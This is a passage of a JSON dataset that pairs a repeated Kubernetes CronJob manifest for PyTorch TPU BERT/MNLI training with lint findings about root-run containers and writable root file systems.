    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"train\" does not have a read-only root file system"
  },
  {
    "id": "8191",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "8192",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "8193",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n        - name: pytorch-datasets-claim\n          persistentVolumeClaim:\n            claimName: pytorch-datasets-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "8194",
    "manifest_path": "data/manifests/the_stack_sample/sample_3039.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: pt-1.6-hf-glue-bert-b-c-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: pytorch-1.6\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - /bin/bash\n          - -c\n          - \"set -u\\nset -e\\nset -x\\n\\ngit clone --recursive -b r1.6 https://github.com/pytorch-tpu/examples.git\\n\\\n            cd examples/deps/transformers && pip install .\\ngit log -1\\npython examples/xla_spawn.py\\\n            \\ \\\\\\n  --num_cores 8 \\\\\\n  examples/text-classification/run_glue.py \\\\\\\n            \\n  --logging_dir=./tensorboard-metrics \\\\\\n  --task_name MNLI \\\\\\n  --data_dir\\\n            \\ /datasets/glue/MNLI \\\\\\n  --cache_dir ./cache_dir \\\\\\n  --do_train \\\\\\\n            \\n  --do_eval \\\\\\n  --num_train_epochs 3 \\\\\\n  --max_seq_length 128 \\\\\\\n            \\n  --learning_rate 3e-5 \\\\\\n  --output_dir MNLI \\\\\\n  --overwrite_output_dir\\\n            \\ \\\\\\n  --logging_steps 100 \\\\\\n  --save_steps 3000 \\\\\\n  --overwrite_cache\\\n            \\ \\\\\\n  --tpu_metrics_debug \\\\\\n --model_name_or_path bert-base-cased\\\n            \\ \\\\\\n--per_gpu_train_batch_size 64 \\\\\\n--per_gpu_eval_batch_size 64\\n\\\n            gsutil -m cp -r ./tensorboard-metrics/* $(MODEL_DIR)\\n\"\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: XLA_USE_BF16\n            value: '0'\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/pytorch-xla:r1.6\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: '12.0'\n              memory: 80Gi\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n          - mountPath: /datasets\n            name: pytorch-datasets-claim\n            readOnly: true\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/pt-1.6/hf-glue-bert-b-c/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"tags_to_ignore\\\": [\\n   \\\"LearningRate\\\"\\\n              \\n  ],\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"alert_for_failed_jobs\\\": false,\\n  \\\"metric_subset_to_alert\\\"\\\n              : [\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\",\\n   \\\"total_wall_time\\\"\\\n              ,\\n   \\\"Accuracy/test_final\\\",\\n   \\\"aten_ops_sum_final\\\"\\n  ],\\n  \\\"\\\n              metric_success_conditions\\\": {\\n   \\\"ExecuteTime__Percentile_99_sec_final\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   },\\n   \\\"aten_ops_sum_final\\\": {\\n    \\\"comparison\\\": \\\"less_or_equal\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 0\\n   \\\n              \\ }\\n   },\\n   \\\"eval_mnli-mm/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"eval_mnli/acc\\\": {\\n    \\\"comparison\\\": \\\"greater\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"fixed_value\\\": 0.80000000000000004\\n\\\n              \\    }\\n   },\\n   \\\"total_wall_time\\\": {\\n    \\\"comparison\\\": \\\"less\\\"\\\n              ,\\n    \\\"success_threshold\\\": {\\n     \\\"stddevs_from_mean\\\": 5\\n   \\\n              \\ },\\n    \\\"wait_for_n_points_of_history\\\": 10\\n   }\\n  }\\n },\\n \\\"\\\n              test_name\\\": \\\"pt-1.6-hf-glue-bert-b-c-conv-v3-8\\\"\\n}\\n\"\n          envFrom:\n          - 